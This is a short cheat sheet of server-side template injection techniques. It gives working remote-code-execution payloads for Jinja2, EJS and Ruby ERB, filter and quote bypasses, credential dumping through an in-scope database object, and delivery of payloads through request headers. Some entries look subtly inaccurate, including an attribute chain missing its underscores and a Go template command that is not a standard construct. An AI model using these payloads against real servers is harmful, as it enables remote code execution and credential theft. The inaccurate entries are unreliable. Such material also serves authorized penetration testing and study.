# Advanced Server-Side Template Injection (SSTI)

## Quote/Filter Bypasses
1. **String Construction**: If quotes (`'` and `"`) are blocked, construct strings dynamically:
   - `request.args.param` (fetch string from another URL argument).
   - `().class.base.name` (fetch class name).
   - `dict(a=1).keys()|join` (construct string 'a' from dict keys!).
2. **Bypass via `__dict__.update()`**: If direct assignment is blocked, use `.update({'__builtins__': ...})` to inject globals.

## Frameworks & Escalation
1. **Jinja2 (Python)**:
   - Walk the MRO (Method Resolution Order): `{{ ''.__class__.__mro__[1].__subclasses__() }}`
   - Find the `subprocess.Popen` class (often index 400+) or `os.system` via `catch_warnings`.
   - **RCE Payload Example**: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
2. **Go Templates**:
   - Go templates are generally less prone to direct RCE, but look for exposed backend structs or functions passed into the execution scope.
   - Example: `{{ .System.Cmd "whoami" }}`
3. **EJS / Node.js**:
   - EJS evaluates straight JS. Provide `process.mainModule.require('child_process').execSync('id')`.
4. **Ruby ERB**:
   - Direct execution often looks like `<%= system('id') %>`.
   - If `system` is blocked, try `` `id` `` or `IO.popen('id')`.
5. **Ruby Sequel::DATABASES Bypass**:
   - Look for the `Sequel` object in scope to access the database connection directly from the template and dump credentials.

## Context & Chain Exploits
- **SQLi to SSTI**: Provide an SSTI payload as a username, then exploit a dashboard that reflects usernames unsafely.
- **Header Injection to SSTI**: Send payloads in `User-Agent` or `X-Forwarded-For` if the server logs them using a template system.
